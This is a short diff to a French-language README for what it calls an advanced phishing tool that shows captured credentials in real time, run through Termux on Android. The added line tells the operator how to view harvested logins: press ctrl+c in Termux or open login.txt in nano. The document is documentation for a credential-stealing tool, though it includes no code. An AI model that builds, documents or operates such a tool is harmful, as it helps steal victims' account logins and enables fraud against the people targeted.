@@ -6,6 +6,7 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
 ## Prérequis
 - Termux installé (disponible sur [F-Droid](https://f-droid.org/en/packages/com.termux/))
 - Connexion Internet stable
+⚠️ pour voir le donner récupérer faîte ctrl+c dans termux ou nano login.txt
 
 ## Installation
 
